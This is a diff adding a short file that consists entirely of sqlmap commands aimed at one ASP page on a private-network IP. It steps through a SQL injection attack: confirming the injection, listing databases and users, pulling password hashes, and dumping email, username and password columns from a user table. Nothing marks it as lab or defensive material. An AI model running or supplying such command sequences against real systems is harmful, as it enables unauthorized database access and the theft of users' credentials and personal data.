@@ -1,0 +1,11 @@
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --batch  
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --dbs  
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --current-db 
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --current-user 
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --users  
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --passwords 
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" -D tourdata --tables 
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" -D tourdata -T userb --columns 
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" -D tourdata -T userb -C "email,Username,userpassword" --dump  
+python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" -D tourdata -T userb -C "email,Username,userpassword" --start 1 --stop 10 --dump  
+
